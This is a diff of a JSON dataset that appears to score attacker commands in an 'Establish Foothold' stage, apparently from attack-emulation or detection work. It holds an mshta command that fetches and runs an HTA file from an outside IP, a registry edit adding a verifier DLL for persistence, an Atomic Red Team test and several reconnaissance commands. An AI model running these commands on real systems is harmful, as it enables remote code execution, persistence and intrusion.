@@ -16,12 +16,20 @@
         "id": "26043e43ef76294ccaa9382431ad8d03"
     },
     {
-        "label": "",
+        "label": "powershell",
         "stage": "Establish Foothold",
         "stage_score": "503.20000000000005",
-        "cmd": "",
+        "cmd": "powershell",
         "raw_cmd": "powershell",
         "id": "307da1fa3a178afd457660831860edf4"
+    },
+    {
+        "label": "",
+        "stage": "Establish Foothold",
+        "stage_score": "503.59999999999997",
+        "cmd": "",
+        "raw_cmd": "",
+        "id": "8695f682358e3f7347e30808cd98aea7"
     },
     {
         "label": "cmd.exe /C  mshta.exe http://124.223.85.207:8082/T1218.005.hta",
@@ -32,12 +40,28 @@
         "id": "0d2c94e733572c798bd98db0887fb661"
     },
     {
-        "cmd": "",
-        "label": "",
+        "cmd": "powershell",
+        "label": "powershell",
         "stage": "Establish Foothold",
         "stage_score": "554.8",
         "raw_cmd": "powershell",
         "id": "17779c98dd6da8170a9de2d84aa835ba"
+    },
+    {
+        "label": "cmd.exe /C  ipconfig &amp; arp -a &amp; route print -4",
+        "stage": "Establish Foothold",
+        "stage_score": "554.8",
+        "cmd": "cmd.exe /C  ipconfig &amp; arp -a &amp; route print -4",
+        "raw_cmd": "cmd",
+        "id": "1b94db3f175fb9d7942c6ef7479573e8"
+    },
+    {
+        "label": "cmd.exe /C whoami",
+        "stage": "Establish Foothold",
+        "stage_score": "554.8",
+        "cmd": "cmd.exe /C whoami",
+        "raw_cmd": "cmd",
+        "id": "25604c4b029525dd26694dc2f060a28f"
     },
     {
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C  reg add / HKEY_LOCAL_MACHINE/software/microsoft/windows nt/currentversion/image file execution options /  /v / verifierdlls /  /d / 1 /  /f",
@@ -144,12 +168,28 @@
         "id": "7c2fddcf389ef1e22dc061a639750bb2"
     },
     {
+        "label": "cmd.exe /C systeminfo",
+        "stage": "Establish Foothold",
+        "stage_score": "554.8",
+        "cmd": "cmd.exe /C systeminfo",
+        "raw_cmd": "cmd",
+        "id": "7ede18ffe0067bc42e26056ca4c34ca6"
+    },
+    {
         "label": "powershell.exe -ExecutionPolicy Bypass -C ./chromeRemoteServices.ps1",
         "stage": "Establish Foothold",
         "stage_score": "554.8",
         "cmd": "powershell.exe -ExecutionPolicy Bypass -C ./chromeRemoteServices.ps1",
         "raw_cmd": "powershell",
         "id": "84e12f6250d627d6ba1a12f3dddbd04c"
+    },
+    {
+        "label": "cmd.exe /C systeminfo",
+        "stage": "Establish Foothold",
+        "stage_score": "554.8",
+        "cmd": "cmd.exe /C systeminfo",
+        "raw_cmd": "cmd",
+        "id": "8cdcb8e5767face1089964cdcbc9273f"
     },
     {
         "label": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1546.008 -TestNumbers 1",
@@ -232,10 +272,18 @@
         "id": "dd2dfc69178e21bf199496889452ab24"
     },
     {
-        "label": "",
+        "label": "cmd.exe /C tasklist",
+        "stage": "Establish Foothold",
+        "stage_score": "554.8",
+        "cmd": "cmd.exe /C tasklist",
+        "raw_cmd": "cmd",
+        "id": "e38f795519c076e34e4b86198b79e6c0"
+    },
+    {
+        "label": "mshta",
         "stage": "Establish Foothold",
         "stage_score": "81.00000000000001",
-        "cmd": "",
+        "cmd": "mshta",
         "raw_cmd": "mshta",
         "id": "9dedd3ea211f0390339381739d51dada"
     },
@@ -368,10 +416,10 @@
         "id": "d473594f5acf4b329514538c244fabab"
     },
     {
-        "label": "",
+        "label": "certutil",
         "stage": "Establish Foothold",
         "stage_score": "49.0",
-        "cmd": "",
+        "cmd": "certutil",
         "raw_cmd": "certutil",
         "id": "1b8326ac3bb130497a914bf3e61a32cc"
     },
